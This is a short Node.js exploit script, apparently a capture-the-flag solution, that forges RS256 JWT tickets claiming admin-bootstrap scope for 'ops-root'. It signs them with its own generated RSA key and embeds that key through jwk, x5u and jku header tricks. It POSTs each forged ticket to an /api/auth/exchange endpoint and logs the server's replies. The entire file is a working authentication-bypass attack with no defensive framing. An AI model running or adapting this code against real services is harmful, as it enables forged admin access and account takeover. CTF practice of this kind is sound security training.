import { generateKeyPairSync, createSign } from "node:crypto";

const BASE = process.env.GHOST_BASE || "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf";

function b64(value) {
  return Buffer.from(typeof value === "string" ? value : JSON.stringify(value)).toString("base64url");
}

function signRs256(header, payload, privateKey) {
  const head = b64(header);
  const body = b64(payload);
  const sig = createSign("RSA-SHA256").update(`${head}.${body}`).sign(privateKey, "base64url");
  return `${head}.${body}.${sig}`;
}

const { publicKey, privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
const jwk = publicKey.export({ format: "jwk" });
const now = Math.floor(Date.now() / 1000);
const payload = {
  typ: "ticket",
  scope: "admin-bootstrap",
  sub: "ops-root",
  iss: "ghost-packet-auth",
  aud: "ghost-packet-ticket",
  iat: now,
  exp: now + 180,
};

const headers = [
  { alg: "RS256", typ: "JWT", kid: "legacy-rs256-retired", jwk },
  { alg: "RS256", typ: "JWT", kid: "primary-rs256", jwk },
  { alg: "RS256", typ: "JWT", jwk },
  { alg: "RS256", typ: "JWT", kid: "legacy-rs256-retired", x5u: "data:," },
  { alg: "RS256", typ: "JWT", kid: "legacy-rs256-retired", jku: "data:," },
];

for (const header of headers) {
  const ticket = signRs256(header, payload, privateKey);
  const res = await fetch(`${BASE}/api/auth/exchange`, {
    method: "POST",
    headers: { Accept: "application/json", "Content-Type": "application/json" },
    body: JSON.stringify({ ticket, grantType: "legacy-bootstrap" }),
  });
  const text = await res.text();
  console.log(JSON.stringify({ header: { ...header, jwk: header.jwk ? true : undefined }, status: res.status, text }));
}
